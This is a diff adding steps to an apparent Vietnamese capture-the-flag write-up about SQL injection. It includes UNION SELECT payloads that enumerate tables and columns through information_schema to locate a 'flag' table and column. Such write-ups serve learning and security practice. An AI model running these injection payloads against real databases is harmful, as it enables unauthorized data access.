@@ -8,7 +8,12 @@
 
 ![img](https://github.com/dnamgithub33/wu_svattt/blob/fc0f4da1a6435d589a4e3c2abe5c0bbfcff5d5b3/img/img.png)
 
-* Đã biết được câu lệnh truy vấn 3 cột, có thể còn nhiều bảng khác chưa được truy vấn ra, sử dụng câu lệnh ```' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -``` 
+* Đã biết được câu lệnh truy vấn 3 cột, có thể còn nhiều bảng khác chưa được truy vấn ra, sử dụng câu lệnh ```' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -``` và tìm được bảng ```flag```
+
+![img](https://github.com/dnamgithub33/wu_svattt/blob/8d05ccaafc84ba837f853e175be5a674a2e4f91a/img/flag_table.PNG)
+
+* Tiếp tục tìm tất cả các cột trong bảng ```flag``` bằng lệnh ```' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='flag'-- -``` và tìm ra cột ```flag```
+
 
 
 
